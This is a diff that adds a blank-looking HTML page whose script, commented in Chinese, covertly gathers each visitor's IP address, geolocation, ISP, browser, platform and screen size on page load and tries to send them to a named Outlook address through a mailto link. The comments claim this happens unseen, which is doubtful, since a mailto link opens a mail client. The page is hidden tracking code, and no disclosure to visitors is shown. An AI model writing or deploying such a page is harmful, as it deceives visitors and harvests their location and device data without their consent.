@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title></title>
+</head>
+<body style="margin:0;padding:0;background:#fff"></body>
+
+<script>
+// 一打开就悄悄获取信息
+(async function () {
+  try {
+    // 1. 获取 IP + 位置
+    const ipRes = await fetch('https://ipapi.co/json/');
+    const ipData = await ipRes.json();
+
+    // 2. 收集信息
+    const log = {
+      访问时间: new Date().toLocaleString(),
+      IP地址: ipData.ip,
+      城市: ipData.city || '未知',
+      地区: ipData.region || '未知',
+      国家: ipData.country_name || '未知',
+      运营商: ipData.org || '未知',
+      浏览器: navigator.userAgent,
+      系统: navigator.platform,
+      屏幕: screen.width + '×' + screen.height
+    };
+
+    // 3. 拼成邮件内容
+    const subject = "有人访问了你的页面";
+    const body = encodeURIComponent(`
+访问时间：${log.访问时间}
+IP：${log.IP地址}
+城市：${log.城市}
+地区：${log.地区}
+国家：${log.国家}
+运营商：${log.运营商}
+浏览器：${log.浏览器}
+系统：${log.系统}
+屏幕：${log.屏幕}
+    `);
+
+    // 4. 悄悄打开邮件（后台自动，用户看不到）
+    window.open(`mailto:lcy123eric@outlook.com?subject=${subject}&body=${body}`, '_blank');
+
+  } catch (e) {}
+})();
+</script>
+</html>
